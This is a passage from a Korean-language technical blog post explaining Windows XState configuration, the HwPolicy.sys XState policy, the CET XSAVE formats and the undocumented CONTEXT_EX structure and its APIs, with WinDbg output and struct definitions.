EnabledUserVisibleSupervisorFeatures : <span class="hljs-number">0x0</span> [Type: <span class="hljs-keyword">unsigned</span> __int64]</code></pre><p>Features 배열에서 다음 5가지 기능의 크기와 오프셋을 확인할 수 있다.</p><pre><code class="hljs c">dx -r2 (((nt!_KUSER_SHARED_DATA*)<span class="hljs-number">0x7ffe0000</span>)-&gt;XState)-&gt;Features.Take(<span class="hljs-number">5</span>)    [<span class="hljs-number">0</span>]              [Type: _XSTATE_FEATURE]        [+<span class="hljs-number">0x000</span>] Offset           : <span class="hljs-number">0x0</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>]        [+<span class="hljs-number">0x004</span>] Size             : <span class="hljs-number">0xa0</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>]    [<span class="hljs-number">1</span>]              [Type: _XSTATE_FEATURE]        [+<span class="hljs-number">0x000</span>] Offset           : <span class="hljs-number">0xa0</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>]        [+<span class="hljs-number">0x004</span>] Size             : <span class="hljs-number">0x100</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>]    [<span class="hljs-number">2</span>]              [Type: _XSTATE_FEATURE]        [+<span class="hljs-number">0x000</span>] Offset           : <span class="hljs-number">0x240</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>]        [+<span class="hljs-number">0x004</span>] Size             : <span class="hljs-number">0x100</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>]    [<span class="hljs-number">3</span>]              [Type: _XSTATE_FEATURE]        [+<span class="hljs-number">0x000</span>] Offset           : <span class="hljs-number">0x340</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>]        [+<span class="hljs-number">0x004</span>] Size             : <span class="hljs-number">0x40</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>]    [<span class="hljs-number">4</span>]              [Type: _XSTATE_FEATURE]        [+<span class="hljs-number">0x000</span>] Offset           : <span class="hljs-number">0x380</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>]        [+<span class="hljs-number">0x004</span>] Size             : <span class="hljs-number">0x40</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>]</code></pre><p>이 크기를 합하면 위의 <code>FeatureSize</code> 필드에 표시된 값인 <code>0x3C0</code>이 된다. 그러나 이 시스템은 <code>Compacted XSAVE</code> 기능을 지원하므로 여기에 표시된 오프셋은 관련이 없으며 모든 기능의 크기를 포함하지만 오프셋은 포함하지 않는 커널에만 유용하게 사용 가능하다.(<code>XCOMP_BV</code>에서 사용되는 압축 마스크를 기반으로 결정되기 때문)</p><h2 id="XState-정책"><a href="#XState-정책" class="headerlink" title="XState 정책"></a>XState 정책</h2><p>프로세서가 XState을 지원하지만 다양한 하드웨어 오류 때문에 특정 프로세서가 이 기능을 제대로 지원하지 못하는 경우가 종종 발생한다. 이 문제를 처리하기 위해 Windows는 일반적으로  라고 하는 하드웨어 정책 드라이버인 <code>HwPolicy.sys</code> 의 리소스 섹션에 저장된 XState 정책을 사용한다.</p><p>Intel x86 아키텍처는 여러 프로세서 벤더 중 하나이므로 커널은 XState 정책을 구문 분석하고 현재 프로세서의 벤더 문자열 및 마이크로코드 버전뿐만 아니라 시그니처, 기능 및 확장 기능을 비교하고 (즉, CPUID 01h 쿼리의 RAX, RDX 및 RCX), 정책에서 일치하는 항목을 찾는다.</p><p>이 작업은 부팅 시에 <code>KiInitializeXSave</code>가 호출하는 <code>KiIntersectFeaturesWithPolicy</code> 함수에서 수행된다. 이 함수는 <code>KiLoadPolicyFromImage</code> 를 호출하여 적절한 XState 정책을 로드하고 <code>KiGetProcessorInformation</code>을 호출하여 CPU의 데이터를 가져온 다음 XState 구성에서 현재 활성화된 각 기능 비트의 유효성을 <code>KiIsXSaveFeatureAllowed</code> 호출을 통해 확인한다.</p><p>이러한 기능은 <code>HwPolicy.sys</code> 드라이버의 리소스 101에서 작동하며 구조는 다음과 같다.</p><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">XSAVE_POLICY</span></span><span class="hljs-class">&#123;</span>    ULONG Version;    ULONG Size;    ULONG Flags;    ULONG MaxSaveAreaLength;    ULONGLONG FeatureBitmask;    ULONG NumberOfFeatures;    XSAVE_FEATURE Features[<span class="hljs-number">1</span>];&#125; XSAVE_POLICY, *PXSAVE_POLICY;</code></pre><p>예를 들어,  <code>19H1</code> 시스템에서 리소스 해커로 추출한 내용은 다음과 같다.</p><pre><code class="hljs c">dx @$policy = (_XSAVE_POLICY*)<span class="hljs-number">0x253d0e90000</span>[+<span class="hljs-number">0x000</span>] Version       : <span class="hljs-number">0x3</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>][+<span class="hljs-number">0x004</span>] Size          : <span class="hljs-number">0x2fd8</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>][+<span class="hljs-number">0x008</span>] Flags         : <span class="hljs-number">0x9</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>][+<span class="hljs-number">0x00c</span>] MaxSaveAreaLength : <span class="hljs-number">0x2000</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>][+<span class="hljs-number">0x010</span>] FeatureBitmask   : <span class="hljs-number">0x7fffffffffffffff</span> [Type: <span class="hljs-keyword">unsigned</span> __int64][+<span class="hljs-number">0x018</span>] NumberOfFeatures : <span class="hljs-number">0x3f</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>][+<span class="hljs-number">0x020</span>] Features      [Type: _XSAVE_FEATURE [<span class="hljs-number">1</span>]]</code></pre><p>각 <code>XSAVE_FEATURE</code>에 대해 각각 CPU 공급 업체 문자열이 있는 <code>XSAVE_VENDOR</code> 구조의 배열을 포함하는 <code>XSAVE_VENDORS</code> 구조에 대한 오프셋과 (지금은 각각 “GenuineIntel”, “AuthenticAMD” 또는 “CentaurHauls”) <code>XSAVE_CPU_ERRATA</code> 구조에 대한 오프셋을 확인할 수 있다. 예를 들어, <code>19H1</code> 테스트 시스템에는 기능 0에 대한 다음 정보가 존재한다.</p><pre><code class="hljs c">dx -r4 @$vendor = (XSAVE_VENDORS*)((<span class="hljs-keyword">int</span>)@$policy-&gt;Features[<span class="hljs-number">0</span>].Vendors + <span class="hljs-number">0x253d0e90000</span>)[+<span class="hljs-number">0x000</span>] NumberOfVendors  : <span class="hljs-number">0x3</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>][+<span class="hljs-number">0x008</span>] Vendor        [Type: _XSAVE_VENDOR [<span class="hljs-number">1</span>]]    [<span class="hljs-number">0</span>]           [Type: _XSAVE_VENDOR]        [+<span class="hljs-number">0x000</span>] VendorId      [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span> [<span class="hljs-number">3</span>]]            [<span class="hljs-number">0</span>]           : <span class="hljs-number">0x756e6547</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>]            [<span class="hljs-number">1</span>]           : <span class="hljs-number">0x49656e69</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>]            [<span class="hljs-number">2</span>]           : <span class="hljs-number">0x6c65746e</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>][+<span class="hljs-number">0x010</span>] SupportedCpu  [Type: _XSAVE_SUPPORTED_CPU][+<span class="hljs-number">0x000</span>] CpuInfo       [Type: XSAVE_CPU_INFO][+<span class="hljs-number">0x020</span>] CpuErrata     : <span class="hljs-number">0x4c0</span> [Type: XSAVE_CPU_ERRATA *][+<span class="hljs-number">0x020</span>] Unused        : <span class="hljs-number">0x4c0</span> [Type: <span class="hljs-keyword">unsigned</span> __int64]</code></pre><p>마지막으로, 각 <code>XSAVE_CPU_ERRATA</code> 구조체는 지정된 XState 지원에 대한 오류 정보와 일치하는 프로세서 정보 데이터를 포함한다. 예를 들어, 테스트 시스템에서 위의 오프셋에서 첫 번째 에라타는 다음과 같다.</p><pre><code class="hljs c">dx -r3 @$errata = (XSAVE_CPU_ERRATA*)((<span class="hljs-keyword">int</span>)@$vendor-&gt;Vendor[<span class="hljs-number">0</span>].SupportedCpu.CpuErrata + <span class="hljs-number">0x253d0e90000</span>)    [+<span class="hljs-number">0x000</span>] NumberOfErrata   : <span class="hljs-number">0x1</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>]    [+<span class="hljs-number">0x008</span>] Errata           [Type: XSAVE_CPU_INFO [<span class="hljs-number">1</span>]]        [<span class="hljs-number">0</span>]              [Type: XSAVE_CPU_INFO]            [+<span class="hljs-number">0x000</span>] Processor        : <span class="hljs-number">0x0</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">char</span>]            [+<span class="hljs-number">0x002</span>] Family           : <span class="hljs-number">0x6</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span>]            [+<span class="hljs-number">0x004</span>] Model            : <span class="hljs-number">0xf</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span>]            [+<span class="hljs-number">0x006</span>] Stepping         : <span class="hljs-number">0xb</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span>]            [+<span class="hljs-number">0x008</span>] ExtendedModel    : <span class="hljs-number">0x0</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">short</span>]            [+<span class="hljs-number">0x00c</span>] ExtendedFamily   : <span class="hljs-number">0x0</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>]            [+<span class="hljs-number">0x010</span>] MicrocodeVersion : <span class="hljs-number">0x0</span> [Type: <span class="hljs-keyword">unsigned</span> __int64]            [+<span class="hljs-number">0x018</span>] Reserved         : <span class="hljs-number">0x0</span> [Type: <span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">long</span>]</code></pre><p>모든 XState 기능에 대한 시스템의 하드웨어 정책 덤프 툴은 <a href="https://github.com/yardenshafir/cet-research/tree/master/Xpolicy">여기</a>에서 사용할 수 있다. 지금은 전체 정책(위에 표시된 것)에 하나의 에라타만 나타난다.</p><p>마지막으로 다음 옵션 로더 명령줄 옵션(및 각 BCD 설정)을 사용하여 XState 기능을 추가로 커스터마이징이 가능하다.</p><ol><li><code>XSAVEPOLICY = n</code> 로드 옵션은 <code>xsavepolicy</code> BCD 옵션을 통해 설정되며 <code>KeXSavePolicyId</code>를 설정하여 로드할 XState 정책을 나타낸다.</li><li><code>XSAVEREMOVEFEATURE = n</code>로드 옵션은 <code>xsaveremovefeature</code> BCD옵션을 통해 설정되며 <code>KeTestRemovedFeatureMask</code> 를 설정한다. 이는 나중에 <code>KiInitializeXSave</code>에 의해 구문 분석되고 지정된 상태 비트를 제거한다. 상태 0 (x87 FPU) 및 상태 1 (SSE)은 이 방법으로 제거할 수 없다.</li><li><code>XSAVEDISABLE</code> 로드 옵션은 <code>xsavedisable</code> BCD 옵션을 통해 설정되어 <code>KeTestDisableXsave</code>를 설정하고 <code>KiInitializeXSave</code>가 모든 XState 구성 데이터를 0으로 설정하여 전체 XState 기능을 비활성화한다.</li></ol><h2 id="CET-XSAVE-영역-포맷"><a href="#CET-XSAVE-영역-포맷" class="headerlink" title="CET XSAVE 영역 포맷"></a>CET XSAVE 영역 포맷</h2><p>CET 구현의 일환으로 Intel은 <code>XSTATE_CET_U(11)</code>와 <code>XSTATE_CET_S(12)</code>라고 하는 두 개의 새로운 비트를 사용자 및 슈퍼바이저 상태에 각각 대응하도록 정의했다. 첫 번째 상태는 <code>XSAVE_CET_U_FORMAT</code>으로 문서화된 16바이트 데이터 구조로, <code>IA32_U_CET</code> MSR(<code>Shadow Stack Enable</code> 플래그가 구성된 경우) 및 <code>IA32_PL3_SSPMSR</code> (Privile 3 수준)을 포함한다. 아직 MSDN 정의가 없는 두 번째 방법은 <code>IA32_PL0/1/2_SSP</code> MSR을 포함한다.</p><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">XSAVE_CET_U_FORMAT</span></span><span class="hljs-class">&#123;</span>    ULONG64 Ia32CetUMsr;    ULONG64 Ia32Pl3SspMsr;&#125; XSAVE_CET_U_FORMAT, *PXSAVE_CET_U_FORMAT;<span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">XSAVE_CET_S_FORMAT</span></span><span class="hljs-class">&#123;</span>    ULONG64 Ia32Pl0SspMsr;    ULONG64 Ia32Pl1SspMsr;    ULONG64 Ia32Pl2SspMsr;&#125; XSAVE_CET_S_FORMAT, *PXSAVE_CET_S_FORMAT;</code></pre><p>필드 이름에서 알 수 있듯이 CET 관련 레지스터는 실제로 각 MSR에 저장된 값이며, 일반적으로 Ring 0의 RDMSR 및 WRMSR 권한이 있는 명령을 통해서만 액세스 할 수 있다. 그러나 프로세서 전역 데이터를 저장하는 대부분의 MSR과 달리 CET는 스레드 단위로 활성화할 수 있으며 Shadow stack pointer도 스레드 단위로 사용할 수 있다. 이러한 이유로 CET 관련 데이터는 운영 체제가 스레드 스위치를 올바르게 처리할 수 있도록 XState 기능의 일부로 구현되어야 한다.</p><p>CET 레지스터는 기본적으로 커널 코드로만 수정 가능한 MSR이기 때문에 <code>CPL3 XSAVE/XRSTOR</code> 명령을 통해 접근할 수 없으며 각각의 상태 비트는 <code>IA32_XSS</code> MSR에서 항상 1로 설정된다. 그러나 운영체제가 유저 모드의 코드가 SSP를 수정하는 것을 완전히 차단할 수는 없다. 유저 모드의 코드는 예외 처리, unwinding, jmp/longjmp 또는 Windows의 <code>Fiber</code> 메커니즘과 같은 특정 기능을 사용해 SSP를 업데이트할 수 있다.</p><p>따라서 Windows가 CS 및 DR7과 같은 특정 보호된 CPU 레지스터를 업데이트하는 메커니즘으로 <a href="https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext">SetThreadContext</a>를 제공하는 것처럼 운영 체제는 스레드가 시스템 호출을 통해 XSate에서 CET 상태를 수정할 수 있는 방법을 제공해야 한다. 따라서 다음 섹션에서는 XState 관련 정보를 지원하기 위해 현대의 Windows 버전에서 <a href="https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-wow64_context">CONTEXT</a> 구조가 CONTEXT_EX 구조로 어떻게 발전했는지, 그리고 예외 관련 시나리오에 대해 CET 관련 처리를 추가하는 동시에 손상된 CONTEXT를 통한 악의적인 제어 흐름 공격을 방지하는 방법에 대해서 알아본다.</p><h1 id="CONTEXT-EX-내부"><a href="#CONTEXT-EX-내부" class="headerlink" title="CONTEXT_EX 내부"></a>CONTEXT_EX 내부</h1><p>콘텍스트 스위치를 할 때 저장해야 하는 레지스터의 수가 점점 늘어나고, 이를 지원하기 위해 새로운 버전의 Windows는 레거시 CONTEXT 구조 외에도 CONTEXT_EX 구조를 도입했다. CONTEXT_EX는 레거시 CONTEXT가 고정 크기인 반면 XSAVE는 스레드, 프로세서 및 시스템 구성 정책에 따라 동적으로 크기가 조정되는 프로세서 상태 구조가 필요하기 때문에 도입되었다.</p><h2 id="CONTEXT-EX-구조"><a href="#CONTEXT-EX-구조" class="headerlink" title="CONTEXT_EX 구조"></a>CONTEXT_EX 구조</h2><p>CONTEXT_EX는 현재 커널 및 유저 모드 예외 처리 기능 전체에서 사용되지만 CONTEXT_EX 구조의 대부분은 문서화되지 않았다. Windows 7 헤더 파일 및 일부 intel의 reference code에 존재하는 일부 정보가 실수로 공개되지 않도록 했음을 알 수 있다. 다음 코드의 주석을 보고 이해할 수 있는 것이 있으면 알려주었으면 한다.</p><pre><code class="hljs c"><span class="hljs-comment">//</span><span class="hljs-comment">// 이 구조체는 CONTEXT_EX의 단일 청크 크기와 오프셋(CONTEXT_EX 구조 시작부터)을 지정한다.</span><span class="hljs-comment">// N.B. 오프셋은 음수일 수 있다.</span><span class="hljs-comment">//</span><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">CONTEXT_CHUNK</span></span><span class="hljs-class">&#123;</span>    LONG Offset;    DWORD Length;&#125; CONTEXT_CHUNK, *PCONTEXT_CHUNK;<span class="hljs-comment">// CONTEXT_EX 구조체는 는 CONTEXT 구조체의 확장이다. </span><span class="hljs-comment">// 콘텍스트 레코드를 프로세서 상태의 일부를 포함하는 분리된 가변크기 버퍼(청크) 세트로 </span><span class="hljs-comment">// 정의한다. 현재 두 개의 버퍼(청크)만 정의된다:</span><span class="hljs-comment">//</span><span class="hljs-comment">// - 기존 CONTEXT 구조를 저장하는 레거시</span><span class="hljs-comment">// - XSAVE 저장 영역 버퍼를 저장하는 XState</span><span class="hljs-comment">// XSAVE_AREA_HEADER, i.e. without the first 512 bytes.</span><span class="hljs-comment">//</span><span class="hljs-comment">// PCONTEXT 포인터를 PCONTEXT_EX 포인터로 변환하는 몇 가지 가정이 있다.</span><span class="hljs-comment">//</span><span class="hljs-comment">// 1. PCONTEXT 포인터와 함께 작동하는 API는 CONTEXT_EX가 CONTEXT 구조 바로 뒤에 저장된다고 가정</span><span class="hljs-comment">//    또한 CONTEXT_EX는 해당 CONTEXT_XXX 플래그가 CONTEXT.ContextFlags에 설정된 경우에만 존재한다고 가정</span><span class="hljs-comment">//</span><span class="hljs-comment">// 2. CONTEXT_EX 구조가 있으면 레거시가 항상 존재</span><span class="hljs-comment">//</span><span class="hljs-comment">// 3. CONTEXT.ContextFlags는 존재하는 청크를 정의</span><span class="hljs-comment">//    즉 CONTEXT_XSTATE가 설정된 경우 CONTEXT_EX.XState가 유효하다.</span><span class="hljs-comment">//</span><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> _<span class="hljs-title">CONTEXT_EX</span></span><span class="hljs-class">&#123;</span>    <span class="hljs-comment">//</span>    <span class="hljs-comment">// 오프셋이 가장 작은 청크에서 시작하는 구조체의 총 크기</span>    <span class="hljs-comment">// N.B. 오프셋은 음수일 수 있다.</span>    <span class="hljs-comment">//</span>    CONTEXT_CHUNK All;    <span class="hljs-comment">// </span>    <span class="hljs-comment">// 기존의 CONTEXT 구조 wrapper</span>    <span class="hljs-comment">// N.B. 청크의 크기는 sizeof(CONTEXT) 보다 작을 수 있다.</span>    <span class="hljs-comment">// (CONTEXT_EXTENDED_REGISTERS가 x86에 설정되지 않은 경우).    </span><span class="hljs-comment">// CONTEXT_CHUNK Legacy;</span>    <span class="hljs-comment">//</span>  <span class="hljs-comment">// CONTEXT_XSTATE : 확장된 프로세서 상태 청크. 상태 저장은 동일한 형식 </span>  <span class="hljs-comment">// XSAVE 작업은 처음 512 바이트를 제외하고 XSAVE_AREA_HEADER에서 시작한다. </span><span class="hljs-comment">// FP 및 SSE 상태에 해당하는 하위 2 비트는 0이어야 한다.</span>    <span class="hljs-comment">// CONTEXT_CHUNK XState;</span>&#125; CONTEXT_EX, *PCONTEXT_EX;<span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> CONTEXT_EX_LENGTH ALIGN_UP_BY(sizeof(CONTEXT_EX), STACK_ALIGN)</span><span class="hljs-comment">//</span><span class="hljs-comment">// 이 매크로를 사용해 콘텍스트 청크를 더 쉽게 조작 가능</span><span class="hljs-comment">//</span></code></pre><p>따라서 이 헤더로 CONTEXT_EX 구조의 레이아웃을 이해하고 시각화할 수 있을 때까지 여러 차례 시도를 했고 다음 다이어그램이 도움이 될 수 있다고 느꼈다.</p><p><img src="/2021/01/17/l0ch/cet-on-windows/4.png"></p><p>다이어그램에서 CONTEXT_EX 구조는 항상 CONTEXT 구조의 끝에 있으며 레거시 및 XState라는 <code>CONTEXT_CHUNK</code> 유형의 3개 필드가 있다. 이들은 오프셋과 데이터의 크기를 정의하고 적절한 데이터 포인터를 검색하기 위한 다양한 <code>RTL_</code> 매크로가 존재한다.</p><p>Legacy 필드는 기존 CONTEXT 구조의 시작을 참조한다. (<code>CONTEXT_EXTENDED_REGISTERS</code>가 제공되지 않으면 x86에서 크기가 더 작을 수 있음) <code>All</code> 필드는 기존 CONTEXT 구조의 시작을 참조하지만 Length는 CONTEXT_EX와 XSAVE 영역에 필요한 패딩/정렬 공간을 포함하여 모든 데이터의 크기를 나타낸다. 마지막으로 <code>XState</code> 필드는 <code>XSAVE_AREA_HEADER</code> 구조 (상태 비트가 활성화되어 데이터가 있는 상태 마스크를 정의함)와 전체 XSAVE 영역의 크기를 참조한다. 이 레이아웃으로 인해 All 및 Legacy에는 음수 오프셋이 적용된다는 점에 유의해야 한다.</p><p>기능이 매우 복잡하기 때문에 <code>Ntdll.dll</code>은 CONTEXT_EX에 저장된 다양한 데이터의 빌드, 읽기, 복사 및 조작을 단순화하기 위해 다양한 API를 export 한다. (이러한 API 중 일부는 <code>Ntoskrn.exe</code> 에서 내부적으로 사용되지만 export 되지는 않는다.) 또한 <code>KernelBase.dll</code>은 이러한 기능을 내부적으로 사용하는 문서화된 Win32 함수를 export 한다.</p><h2 id="CONTEXT-EX-초기화"><a href="#CONTEXT-EX-초기화" class="headerlink" title="CONTEXT_EX 초기화"></a>CONTEXT_EX 초기화</h2><p>먼저 호출자는 CONTEXT_EX를 저장하기 위해 할당할 메모리 크기를 파악해야 하는데, 이는 다음 API를 사용하여 수행할 수 있다.</p><pre><code class="hljs c">NTSYSAPIULONGNTAPIRtlGetExtendedContextLength (    _In_ ULONG ContextFlags,    _Out_ PULONG ContextLength);</code></pre><p>호출자는 저장할 레지스터를 지정하기 위해 적절한 <code>CONTEXT_XXX</code> 플래그를 제공해야 한다. 그런 다음이 API는 <code>SharedUserData.XState.EnabledFeatures</code> 및 <code>SharedUserData.XState.EnabledUserVisibleSupervisorFeatures</code> 를 읽고 모든 비트를 통합해 아래의 확장 함수로 전달한다.</p><pre><code class="hljs c">NTSYSAPIULONGNTAPIRtlGetExtendedContextLength2 (    _In_ ULONG ContextFlags,    _Out_ PULONG ContextLength,    _In_ ULONG64 XStateCompactionMask);</code></pre><p>이 최신 API를 사용하면 공유 사용자 데이터의 XState 구성에서 모든 활성화된 기능을 가져오는 대신 실제로 저장할 XState 상태를 수동으로 지정할 수 있다. 이로 인해 CONTNENT_EX 구조의 크기가 작아져 모든 XState 데이터를 저장할 공간이 충분하지 않게 되므로 이 CONTNT_EX를 나중에 사용하면 지정된 마스크 외부에서 XState Bits를 사용하지 않아야 한다.</p><p>다음으로 호출자는 CONTEXT_EX에 메모리를 할당하고 (대부분의 경우 Windows는 예외 경로에서 메모리 할당 실패를 방지하기 위해 <code>alloca</code>를 사용한다.) 다음 두 API 중 하나를 사용한다.</p><pre><code class="hljs c">NTSYSAPIULONGNTAPIRtlInitializeExtendedContext (    _Out_ PVOID Context,    _In_ ULONG ContextFlags,    _Out_ PCONTEXT_EX* ContextEx);NTSYSAPIULONGNTAPIRtlInitializeExtendedContext2 (    _Out_ PVOID Context,    _In_ ULONG ContextFlags,    _Out_ PCONTEXT_EX* ContextEx,    _In_ ULONG64 XStateCompactionMask);</code></pre><p>이전과 마찬가지로 최신 API에서는 압축된 형식으로 저장할 XState 상태를 수동으로 지정할 수 있다. 지정하지 않으면 사용 가능한 모든 기능 (<code>SharedUserData</code> 기반)이 있는 것으로 간주된다.  호출자는 <code>RtlGetExtendedContextLength(2)</code>에 대한 호출과 동일한 <code>ContextFlags</code>를 지정해 콘텍스트 구조가 올바른 크기로 할당되었는지 확인해야 한다. 이후 호출자는 입력 CONTEXT 버퍼를 따라갈 것으로 예상되는 CONTEXT_EX 구조의 포인터를 받는다.</p><p>CONTEXT_EX가 존재하면 호출자는 먼저 레거시 CONTEXT 구조를 가져올 수 있다. (크기에 대한 가정 없이). 다음 API로 수행할 수 있다.</p><pre><code class="hljs c">NTSYSAPIPCONTEXTNTAPIRtlLocateLegacyContext (    _In_ PCONTEXT_EX ContextEx,    _Out_opt_ PULONG Length,);</code></pre><p>그러나 이전에 언급했듯이 이들은 Windows의 NT 계층에 의해 노출되는 문서화되지 않은 내부 API다. 일반적인 Win32 응용 프로그램은 다음 함수를 사용하여 XState 호환 CONTEXT 구조의 사용을 단순화한다.</p><pre><code class="hljs c">WINBASEAPIBOOLWINAPIInitializeContext (    _Out_writes_bytes_opt_(*ContextLength) PVOID Context,    _In_ DWORD ContextFlags,    _Out_ PCONTEXT_EX Context,    _Inout_ PDWORD ContextFlags);WINBASEAPIBOOLWINAPIInitializeContext2 (    _Out_writes_bytes_opt_(*ContextLength) PVOID Context,    _In_ DWORD ContextFlags,    _Out_ PCONTEXT_EX Context,    _Inout_ PDWORD ContextFlags,    _In_ ULONG64 XStateCompactionMask);</code></pre><p>이 두 API는 문서화되지 않은 API와 비슷하게 작동한다. 호출자가 Buffer 및 Context 매개 변수로 처음 NULL을 전달하면 함수는 <code>ContextLength</code>에 필요한 길이를 반환하며 호출자는 메모리에 할당한다. 두 번째 시도에서 호출자는 할당된 포인터를 Buffer에 전달하고 기본 CONTEXT_EX 구조에 대한 정보 없이 Context의 CONTEXT 구조에 대한 포인터를 받는다.</p><h2 id="CONTEXT-EX에서-XState-기능-마스크-제어"><a href="#CONTEXT-EX에서-XState-기능-마스크-제어" class="headerlink" title="CONTEXT_EX에서 XState 기능 마스크 제어"></a>CONTEXT_EX에서 XState 기능 마스크 제어</h2><p>CONTEXT_EX의 <code>XSAVE_AREA_HEADER</code>의 Mask 필드에 포함된 <code>XSTATE_BV</code> (확장 기능 마스크)에 액세스 하기 위해 시스템은  XState 마스크를 수정하기 위한 API와 함께 CONTEXT_EX에서 어떤 XState 기능이 활성화되어 있는지 쉽게 확인할 수 있도록 두 개의 API를 export 한다.</p><p>그러나 Windows는 XSAVE 영역에 x87 FPU (0) 및 SSE (1) 상태를 저장하지 않고 대신 <code>FXSAVE</code> 명령을 사용한다. 즉, XSAVE 영역에 레거시 영역이 포함되지 않고 즉시 <code>XSAVE_AREA_HEADER</code>로 시작된다. 이로 인해 Get API는 항상 하위 2 비트를 마스킹한다. 또한 Set API는 지정된 기능이 XState 구성의 <code>EnabledFeatures</code>에 있는지 확인한다.</p><p><code>InitializeContext2</code>(또는 내부 네이티브 APIs)에서 하드 코딩된 압축 마스크가 지정된 경우 Set API를 사용하여 기존 상태 비트를 생략해서는 안된다. (새 비트를 추가하면 CONTEXT_EX에 초기화되지 않은 추가 상태 데이터가 포함되므로 이 데이터 없이 이미 사전 할당되었을 것이다.)</p><pre><code class="hljs c">NTSYSAPIULONG64NTAPIRtlGetExtendedFeaturesMask (    _In_ PCONTEXT_EX ContextEx);NTSYSAPIULONG64NTAPIRtlSetExtendedFeaturesMask (    _In_ PCONTEXT_EX ContextEx,    _In_ ULONG64 FeatureMask);</code></pre><p>위 API의 문서화된 형식은 다음과 같다.</p><pre><code class="hljs c">WINBASEAPIBOOLWINAPIGetXStateFeaturesMask (    _In_ PCONTEXT Context    _Out_ PDWORD64 FeatureMask);NTSYSAPIULONG64NTAPISetXStateFeaturesMask (    _In_ PCONTEXT Context,    _In_ DWORD64 FeatureMask);</code></pre><h2 id="CONTEXT-EX에서-XState-기능-찾기"><a href="#CONTEXT-EX에서-XState-기능-찾기" class="headerlink" title="CONTEXT_EX에서 XState 기능 찾기"></a>CONTEXT_EX에서 XState 기능 찾기</h2><p>CONTEXT_EX 구조의 복잡성과 XState 기능이 압축되거나 압축되지 않은 형태로 존재할 수 있고 존재 여부도 앞서 설명한 다양한 상태 마스크에 의존한다는 사실 (특히 최적화된 XSAVE가 지원되는 경우)로 인해, 호출자는 CONTEXT_EX 내의 XSAVE 영역에서 관련 상태 데이터에 대한 포인터를 쉽고 빠르게 얻기 위한 라이브러리 함수가 필요하다.</p><p>현재 다음과 같은 두 가지 함수가 존재한다. <code>RtlLocateExtendedFeature</code>는 <code>RtlLocateExtendedFeature2</code>의 wrapper이며 구성 매개 변수로 <code>SharedUserData.XState</code>에 대한 포인터를 제공한다. 두 함수 모두 export 할 때 호출자가 선택한 경우 후자의 API에서 자체 사용자 지정 XState 구성을 수동으로 지정할 수도 있다.</p><pre><code class="hljs c">NTSYSAPIPVOIDNTAPIRtlLocateExtendedFeature (    _In_ CONTEXT_EX ContextEx,    _In_ ULONG FeatureId,    _Out_opt_ PULONG Length);NTSYSAPIPVOIDNTAPIRtlLocateExtendedFeature2 (    _In_ CONTEXT_EX ContextEx,    _In_ ULONG FeatureId,    _In_ PXSTATE_CONFIGURATION Configuration,    _Out_opt_ PULONG Length);</code></pre><p>두 함수 모두 CONTEXT_EX 구조와 요청된 기능의 ID를 수신하고 기능이 XSAVE 영역에 저장된 위치에 대한 포인터를 반환하기 위해 XState 구성 데이터를 구문 분석한다. 지정된 기능에 대한 실제 값을 확인하거나 반환하지 않으며 이는 호출자에게 달려 있다.</p><p>포인터를 찾기 위해 <code>RtlLocateExtendedFeature2</code>는 다음을 수행한다:</p><ul><li>기능 ID가 2 이상 (x87 FPU 및 SSE 상태는 Windows의 XSAVE를 통해 저장되지 않으므로) 및 64 (가능한 가장 높은 XState 기능 비트) 미만인지 확인한다.</li><li>CONTEXT_EX + <code>CONTEXT_EX.XState.Offset</code>에서 <code>XSAVE_AREA_HEADER</code>를 가져온다.</li><li><code>Configuration</code>-&gt; <code>ControlFlags.CompactionEnabled</code> 플래그에서 압축을 사용하는지 여부를 알 수 있다.</li><li>압축되지 않은 형식을 사용하는 경우 :<ul><li><code>Configuration</code>-&gt; <code>Features[n].Offset</code> 및 <code>.Size</code>를 